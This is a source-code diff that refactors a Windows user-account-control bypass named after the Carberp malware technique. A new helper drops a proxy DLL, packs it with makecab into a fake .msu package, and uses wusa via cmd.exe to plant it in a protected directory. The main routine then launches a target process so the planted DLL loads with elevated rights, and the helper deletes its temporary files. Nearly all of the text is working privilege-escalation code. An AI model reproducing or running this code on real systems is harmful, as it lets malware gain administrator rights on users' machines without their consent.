@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     1.40
+*  VERSION:     1.50
 *
-*  DATE:        04 Apr 2015
+*  DATE:        05 Apr 2015
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -18,6 +18,79 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+/*
+* ucmWusaCopyFile
+*
+* Purpose:
+*
+* Copy file to protected directory using wusa.
+*
+*/
+BOOL ucmWusaCopyFile(
+	LPWSTR lpSourceDll,
+	LPWSTR lpMsuPackage,
+	LPWSTR lpCommandLine,
+	PVOID FileBuffer,
+	DWORD FileBufferSize
+	)
+{
+	BOOL bResult = FALSE, cond = FALSE;
+	WCHAR szDllFileName[MAX_PATH + 1];
+	WCHAR szMsuFileName[MAX_PATH + 1];
+	WCHAR szCmd[MAX_PATH * 4];
+
+	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
+	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+
+	do {
+
+		if (ExpandEnvironmentStringsW(lpSourceDll,
+			szDllFileName, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		if (ExpandEnvironmentStringsW(lpMsuPackage,
+			szMsuFileName, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		//drop proxy dll
+		if (!supWriteBufferToFile(szDllFileName, FileBuffer, FileBufferSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+
+		//create cab with msu extension
+		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
+		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
+		if (!supRunProcess(L"makecab.exe", szCmd)) {
+			OutputDebugString(TEXT("[UCM] Makecab failed"));
+			break;
+		}
+
+		//extract msu data to target directory
+		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
+		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
+		bResult = supRunProcess(L"cmd.exe", szCmd);
+		if (bResult == FALSE) {
+			OutputDebugString(TEXT("[UCM] Wusa copy file failed"));
+			break;
+		}
+
+	} while (cond);
+
+	//cleanup
+	if (szDllFileName[0] != 0) {
+		DeleteFileW(szDllFileName);
+	}
+	if (szMsuFileName[0] != 0) {
+		DeleteFileW(szMsuFileName);
+	}
+	return bResult;
+}
 
 /*
 * ucmWusaMethod
@@ -35,12 +108,15 @@ BOOL ucmWusaMethod(
 {
 	BOOL bResult = FALSE, cond = FALSE;
 	LPWSTR lpSourceDll, lpMsuPackage, lpCommandLine, lpTargetProcess;
-	WCHAR szDllFileName[MAX_PATH + 1];
-	WCHAR szMsuFileName[MAX_PATH + 1];
 	WCHAR szCmd[MAX_PATH * 4];
 
-	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
-	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+	if (
+		(ProxyDll == NULL) ||
+		(ProxyDllSize == 0)
+		)
+	{
+		return FALSE;
+	}
 
 	switch (dwType) {
 
@@ -66,37 +142,10 @@ BOOL ucmWusaMethod(
 
 	do {
 
-		if (ExpandEnvironmentStringsW(lpSourceDll,
-			szDllFileName, MAX_PATH) == 0)
+		//copy file to the protected directory
+		if (!ucmWusaCopyFile(lpSourceDll, lpMsuPackage, 
+			lpCommandLine, ProxyDll, ProxyDllSize))
 		{
-			break;
-		}
-
-		if (ExpandEnvironmentStringsW(lpMsuPackage,
-			szMsuFileName, MAX_PATH) == 0)
-		{
-			break;
-		}
-
-		//drop proxy dll
-		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop proxy dll"));
-			break;
-		}
-
-		//create cab with msu extension
-		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
-		if (!supRunProcess(L"makecab.exe", szCmd)) {
-			OutputDebugString(TEXT("[UCM] Makecab failed"));
-			break;
-		}
-
-		//extract msu data to target directory
-		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
-		if (!supRunProcess(L"cmd.exe", szCmd)) {
-			OutputDebugString(TEXT("[UCM] Wusa failed"));
 			break;
 		}
 
@@ -111,13 +160,6 @@ BOOL ucmWusaMethod(
 
 	} while (cond);
 
-	//cleanup
-	if (szDllFileName[0] != 0) {
-		DeleteFileW(szDllFileName);
-	}
-	if (szMsuFileName[0] != 0) {
-		DeleteFileW(szMsuFileName);
-	}
 
 	return bResult;
 }
